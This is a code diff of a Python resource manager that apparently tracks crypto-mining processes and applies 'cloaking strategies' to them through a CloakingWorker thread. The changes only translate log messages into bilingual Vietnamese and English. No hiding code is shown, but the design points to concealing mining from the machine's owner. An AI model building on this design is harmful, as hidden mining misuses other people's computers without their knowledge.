@@ -60,12 +60,12 @@ class SharedResourceManager:
         
         # Kiểm tra security context
         security_context = self.privileged_manager.validate_security_context()
-        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")
+        self.logger.info(f"🔐 [Security Context] (ngữ cảnh bảo mật – người dùng/quyền root): User={security_context['user']}, Root={security_context['is_root']}")
 
         self._nvml_init = False
         # CPU-only build: NVML disabled; skip initialization entirely
         self.initialize_nvml()
-        self.logger.info("SharedResourceManager khởi tạo OK (CPU-only, NVML disabled).")
+        self.logger.info("SharedResourceManager khởi tạo OK [CPU-only] (chỉ bản CPU), [NVML] (thư viện quản lý GPU NVIDIA) đã vô hiệu hoá.")
 
     def is_nvml_initialized(self) -> bool:
         return self._nvml_init
@@ -78,7 +78,7 @@ class SharedResourceManager:
         # CPU-only build: nothing to shutdown
         if self._nvml_init:
             self._nvml_init = False
-            self.logger.debug("NVML shutdown skipped (CPU-only).")
+            self.logger.debug("Bỏ qua tắt [NVML] (thư viện quản lý GPU NVIDIA) [CPU-only] (chỉ bản CPU).")
 
     def get_process_cache_usage(self, pid: int) -> float:
         """
@@ -227,7 +227,7 @@ class ResourceManager(IResourceManager):
         :raises: ValueError if configuration is invalid
         """
         try:
-            self.logger.info("🔍 Validating ResourceManager configuration...")
+            self.logger.info("🔍 [Validating] (xác thực) cấu hình ResourceManager...")
             
             # ✅ VALIDATION 1: Check process priority map
             if not hasattr(config, 'process_priority_map'):
@@ -284,12 +284,12 @@ class ResourceManager(IResourceManager):
                 
                 config = ConfigWrapper(original_config)
             
-            self.logger.info("✅ Configuration validation completed successfully")
+            self.logger.info("✅ [Configuration Validation] (xác thực cấu hình) hoàn tất thành công")
             
             # ✅ LOG CONFIGURATION SUMMARY
             priority_count = len(getattr(config, 'process_priority_map', {}))
             strategy_count = len(getattr(config, 'cloaking_strategies', {}))
-            self.logger.info(f"📋 Configuration summary: {priority_count} process priorities, {strategy_count} cloaking strategies")
+            self.logger.info(f"📋 [Configuration Summary] (tổng quan cấu hình): {priority_count} [process priorities] (độ ưu tiên tiến trình), {strategy_count} [cloaking strategies] (chiến lược che giấu)")
             
             return config
             
@@ -310,7 +310,7 @@ class ResourceManager(IResourceManager):
             pid = event_data.get('pid')
             adjustment_type = event_data.get('type', 'unknown')
             
-            self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
+            self.logger.info(f"Đang xử lý [Resource Adjustment] (điều chỉnh tài nguyên) cho PID={pid}, loại={adjustment_type}")
             
         except Exception as e:
             self.logger.error(f"❌ Error in resource adjustment processing: {e}")
@@ -336,8 +336,8 @@ class ResourceManager(IResourceManager):
                 self.logger.debug(f"[TRACE] Unable to read subscribers: {sub_err}")
             
         except Exception as e:
-            self.logger.error(f"❌ EventBus setup failed: {e}")
-            self.logger.warning("⚠️ Running without EventBus - using fallback mode")
+            self.logger.error(f"❌ [EventBus] (bus sự kiện) thiết lập thất bại: {e}")
+            self.logger.warning("⚠️ Chạy không có [EventBus] (bus sự kiện) – dùng [fallback mode] (chế độ dự phòng)")
             self.event_bus = None
 
     def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
@@ -394,7 +394,7 @@ class ResourceManager(IResourceManager):
 
     def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
         """(CPU-only) GPU events bị vô hiệu hóa."""
-        self.logger.info("[CPU-only] Ignoring GPU mining event.")
+        self.logger.info("[CPU-only] (chỉ bản CPU) Bỏ qua sự kiện GPU mining.")
         return
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
@@ -496,7 +496,7 @@ class ResourceManager(IResourceManager):
                 return ['network', 'memory']  # Minimal additional strategies
                 
         except Exception as e:
-            self.logger.error(f"Error determining additional strategies: {e}")
+            self.logger.error(f"Lỗi xác định [additional strategies] (chiến lược bổ sung): {e}")
             return ['network', 'memory']  # Fallback to basic strategies
 
     def _filter_available_strategies(self, strategies: List[str]) -> List[str]:
@@ -514,19 +514,19 @@ class ResourceManager(IResourceManager):
                 if self._is_strategy_available(strategy):
                     available.append(strategy)
                 else:
-                    self.logger.debug(f"Strategy '{strategy}' not available, skipping")
+                    self.logger.debug(f"[Strategy] (chiến lược) '{strategy}' không khả dụng, bỏ qua")
             
             # ✅ ENSURE PRIMARY STRATEGY: Always include at least primary strategy
             if not available and strategies:
                 primary = strategies[0]  # First strategy is primary
                 if self._is_strategy_available(primary):
                     available.append(primary)
-                    self.logger.warning(f"Only primary strategy '{primary}' available")
+                    self.logger.warning(f"Chỉ có [primary strategy] (chiến lược chính) '{primary}' khả dụng")
             
             return available
             
         except Exception as e:
-            self.logger.error(f"Error filtering available strategies: {e}")
+            self.logger.error(f"Lỗi lọc [available strategies] (các chiến lược khả dụng): {e}")
             # Fallback to primary strategy only
             return [strategies[0]] if strategies else []
 
@@ -557,7 +557,7 @@ class ResourceManager(IResourceManager):
             return availability_checks.get(strategy_name, False)
             
         except Exception as e:
-            self.logger.debug(f"Error checking strategy availability for '{strategy_name}': {e}")
+            self.logger.debug(f"Lỗi kiểm tra [strategy availability] (khả dụng chiến lược) cho '{strategy_name}': {e}")
             return False
 
     def _check_network_availability(self) -> bool:
@@ -721,12 +721,12 @@ class ResourceManager(IResourceManager):
                 self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")
 
     def start(self):
-        self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
+        self.logger.info("🚀 Bắt đầu ResourceManager – [Ultra-Fast Non-Blocking Initialization] (khởi tạo siêu nhanh không chặn)...")
         start_time = time.time()
         try:
             # Step 1: Minimal essential initialization only
             step_start = time.time()
-            self.logger.info("⚡ Step 1/3: Essential components creation...")
+            self.logger.info("⚡ [Step 1/3] (bước 1/3): Tạo [essential components] (thành phần cốt lõi)...")
             
             # ✅ ENHANCED: Shared resource managers creation với singleton optimization
             try:
@@ -746,22 +746,22 @@ class ResourceManager(IResourceManager):
                     
                 self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
             except Exception as e:
-                self.logger.warning(f"Shared resource managers creation failed: {e} - using fallback mode")
+                self.logger.warning(f"Tạo [shared resource managers] (bộ quản lý tài nguyên dùng chung) thất bại: {e} - dùng [fallback mode] (chế độ dự phòng)")
                 resource_managers = {}
 
             # Step 2: Fast SharedResourceManager với lazy NVML init
             step_start = time.time()
-            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
+            self.logger.info("⚡ [Step 2/3] (bước 2/3): [SharedResourceManager] (trình quản lý tài nguyên chung) nhanh (khởi tạo lười/lazy init)...")
             try:
                 self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
                 self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
             except Exception as e:
-                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
+                self.logger.warning(f"Khởi tạo [SharedResourceManager] (trình quản lý tài nguyên chung) thất bại: {e} - tiếp tục không dùng tài nguyên chung")
                 self.shared_resource_manager = None
 
             # Step 3: Background worker setup (non-blocking)
             step_start = time.time()
-            self.logger.info("⚡ Step 3/3: Background workers setup...")
+            self.logger.info("⚡ [Step 3/3] (bước 3/3): Thiết lập [background workers] (các luồng nền)...")
             
             # Start worker thread ngay lập tức
             adjust_thread = threading.Thread(
@@ -800,14 +800,14 @@ class ResourceManager(IResourceManager):
                 self.logger.debug(f"[DIAGNOSTIC] Unable to initialize core loggers: {init_log_err}")
 
             total_time = time.time() - start_time
-            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
+            self.logger.info(f"🎯 Khởi động ResourceManager hoàn tất sau {total_time:.2f}s (mục tiêu <5s)")
             
             # ✅ NEW: Process Discovery for existing mining processes
-            self.logger.info("🔍 [PROCESS DISCOVERY] Scanning for existing mining processes...")
+            self.logger.info("🔍 [PROCESS DISCOVERY] (khám phá tiến trình) Quét các tiến trình khai thác hiện có...")
             self._discover_and_register_existing_processes()
             
             # Ultra-fast main loop với minimal monitoring
-            self.logger.info("🔄 Entering minimal main monitoring loop...")
+            self.logger.info("🔄 Bắt đầu vòng lặp giám sát tối thiểu (minimal main monitoring loop)...")
             last_discovery_time = time.time()
             discovery_interval = 30  # Run Process Discovery every 30 seconds
             
@@ -816,13 +816,13 @@ class ResourceManager(IResourceManager):
                 
                 # Periodic Process Discovery để phát hiện mining processes mới
                 if current_time - last_discovery_time >= discovery_interval:
-                    self.logger.info("🔍 [PERIODIC DISCOVERY] Running periodic process discovery...")
+                    self.logger.info("🔍 [PERIODIC DISCOVERY] (khám phá định kỳ) Đang chạy khám phá tiến trình theo chu kỳ...")
                     self._discover_and_register_existing_processes()
                     last_discovery_time = current_time
                 
                 time.sleep(1.0)  # Basic monitoring interval
 
-            self.logger.info("ResourceManager main loop completed.")
+            self.logger.info("Vòng lặp chính của ResourceManager đã hoàn tất.")
         except Exception as e:
             self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
             self.shutdown()
@@ -893,7 +893,7 @@ class ResourceManager(IResourceManager):
         """
         ✅ OPTIMIZED: Streamlined cloaking worker với type-aware processing
         """
-        self.logger.info("=== Starting optimized CloakingWorker...")
+        self.logger.info("=== Bắt đầu [CloakingWorker] (luồng che giấu tối ưu hoá)...")
         pid = None
 
         while not self._stop_flag:
@@ -913,7 +913,7 @@ class ResourceManager(IResourceManager):
                 pid = p.pid
                 process_type = task.get('process_type', 'CPU')
                 
-                self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")
+                self.logger.info(f"[CloakingWorker] (luồng che giấu) Đang xử lý tác vụ {process_type} cho PID={pid}")
 
                 if task['type'] == 'cloaking' and self.shared_resource_manager:
                     strategies = task.get('strategies', [])
@@ -1073,7 +1073,7 @@ class ResourceManager(IResourceManager):
             except Exception as e:
                 self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")
 
-        self.logger.info("=== CloakingWorker stopped")
+        self.logger.info("=== [CloakingWorker] (luồng che giấu) đã dừng")
 
     def discover_mining_processes(self) -> List[MiningProcess]:
         """
@@ -1083,7 +1083,7 @@ class ResourceManager(IResourceManager):
         try:
             with self.mining_processes_lock:
                 mining_processes = list(self.mining_processes)
-                self.logger.info(f"✅ EventBus discovery: Found {len(mining_processes)} tracked processes")
+                self.logger.info(f"✅ [EventBus] (bus sự kiện) phát hiện: tìm thấy {len(mining_processes)} tiến trình được theo dõi")
                 return mining_processes
                 
         except Exception as e:
